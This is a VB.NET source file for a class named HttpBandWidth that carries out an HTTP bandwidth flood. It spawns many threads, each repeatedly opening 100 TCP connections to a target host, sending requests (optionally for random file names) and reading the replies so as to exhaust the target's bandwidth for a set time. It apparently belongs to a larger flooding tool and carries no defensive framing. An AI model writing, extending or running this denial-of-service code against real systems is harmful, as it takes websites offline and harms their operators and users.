Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Threading

Public Class HttpBandWidth
    Private ThreadsEnded = 0
    ' Private _Delay As Integer
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private ThreadstoUse As Integer
    Private Threads As Thread()
    Private Port As Integer
    Private AttackRunning As Boolean = False
    Private attacks As Integer = 0
    Private Method As String
    Private PostDATA As String
    Private RandomFile As Boolean
    Private File As String
    Public Sub New(ByVal model As HttpBandWidthModel)
        If Not AttackRunning = True Then
            AttackRunning = True
            CutURL(model.Host)
            Method = model.Method
            ThreadstoUse = model.ThreadstoUse
            TimetoAttack = model.Time
            PostDATA = model.PostDATA
            RandomFile = model.RandomFile
            Port = model.Port
            Threads = New Thread(ThreadstoUse - 1) {}
            GetFloodsBase().SetMessage("Bandwidth attack")
            For i As Integer = 0 To ThreadstoUse - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else
            GetFloodsBase().SetMessage("A Bandwidth Flood Attack is Already Running on " & HostToAttack)
        End If

    End Sub

    Private Sub Ended()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            GetFloodsBase().SetMessage("Bandwidth Flood on " & HostToAttack & " finished successfully, downloading the file " & attacks.ToString & " times.")
            attacks = 0
        End If

    End Sub

    Public Sub Stoped()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            GetFloodsBase().SetMessage("Bandwidth Flood on " & HostToAttack & " aborted successfully, downloading the file " & attacks.ToString & " times.")
            attacks = 0
        Else
            GetFloodsBase().SetMessage("No Bandwidth Flood Attack is Running!")
        End If
    End Sub
    Public Sub CutURL(ByVal url As String)
        If url.Contains("http://") Then url = url.Replace("http://", String.Empty)
        If url.Contains("https://") Then url = url.Replace("http://", String.Empty)
        If url.Contains("www.") Then url = url.Replace("www.", String.Empty)
        Dim host As New StringBuilder()
        Dim _file As New StringBuilder()
        For i = 0 To url.IndexOf("/")
            host.Append(url.Chars(i))
        Next
        For i = url.IndexOf("/") To url.Length
            _file.Append(url.Chars(i))
        Next
        HostToAttack = host.ToString
        File = _file.ToString
    End Sub
    Public Function GenerateRandomString(ByRef len As Integer, ByRef upper As Boolean) As String
        Dim rand As New Random()
        Dim allowableChars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789".ToCharArray()
        Dim final As String = String.Empty
        For i As Integer = 0 To len - 1
            final += allowableChars(rand.Next(allowableChars.Length - 1))
        Next

        Return IIf(upper, final.ToUpper(), final)
    End Function
    Private Sub DoWork()
        Try
            Dim socketArray As Socket() = New Socket(100 - 1) {}
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew
            Do While (stopwatch.Elapsed < span)
                Try
                    Dim i As Integer
                    For i = 0 To 100 - 1

                        If RandomFile Then
                            File = GenerateRandomString(5, True)
                        End If

                        socketArray(i) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                        socketArray(i).Connect(Dns.GetHostAddresses(HostToAttack), Port)

                        Dim headerContent = New StringBuilder()
                        headerContent.AppendLine(Method & " " & File & " HTTP/1.1")
                        headerContent.AppendLine("Accept: */*")
                        headerContent.AppendLine("Host: " & HostToAttack)
                        headerContent.AppendLine("Connection: keep-alive")
                        headerContent.AppendLine()

                        socketArray(i).Send(ASCIIEncoding.Default.GetBytes(headerContent.ToString), SocketFlags.None)

                        attacks = attacks + 1
                        GetFloodsBase().Set_AttackUpStrengOnByte(attacks * headerContent.Length)

                    Next i
                    Dim j As Integer
                    For j = 0 To 100 - 1
                        Dim bytes As Integer = 0
                        Dim sb = New StringBuilder()
                        Dim bytesReceived As Byte() = New Byte(255) {}

                        Do
                            bytes = socketArray(j).Receive(bytesReceived, bytesReceived.Length, 0)
                            sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                        Loop Until bytes > 0

                        GetFloodsBase().Set_AttackDownStrengOnByte(attacks * sb.ToString().Length)
                    Next j
                    Continue Do
                Catch

                    Continue Do
                End Try
            Loop
        Catch : End Try
        Ended()
    End Sub
End Class
